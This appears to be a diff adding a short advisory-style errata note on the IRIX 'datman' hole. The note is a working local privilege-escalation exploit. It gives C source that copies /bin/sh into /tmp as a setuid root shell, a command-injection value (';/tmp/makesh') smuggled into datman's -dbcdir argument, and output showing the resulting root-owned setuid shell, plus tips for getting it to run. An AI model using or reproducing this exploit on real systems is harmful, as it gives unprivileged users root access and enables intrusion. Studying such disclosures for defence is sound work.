@@ -1,0 +1,25 @@
+Irix: datman hole, errata
+
+% cat > /tmp/makesh.c
+main()
+{
+  seteuid(0); setegid(0);
+  system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");
+}
+% cc /tmp/makesh.c -o /tmp/makesh
+% mv .cddb .cddb.old
+% touch .cdplayerrc
+% /usr/sbin/datman -dbcdir "/tmp/blah;/tmp/makesh"
+  Created "/tmp/blah"
+Converting /home/medc2/yuri/.cdplayerrc into /tmp/blah
+
+% ls -l /tmp/sh
+-r-sr-sr-x    1 root     sys       140784 Dec  9 15:24 /tmp/sh*
+
+In above example, few dialog windows will pop up after starting datman.
+Just press enter in each of them.  Make sure your DISPLAY is set correctly.
+
+Note though you can pass arbitrary shell commands to sh in -dbcdir, these
+commands will be executed with euid set to your uid, so seteuid(0) needs to
+be called first.
+
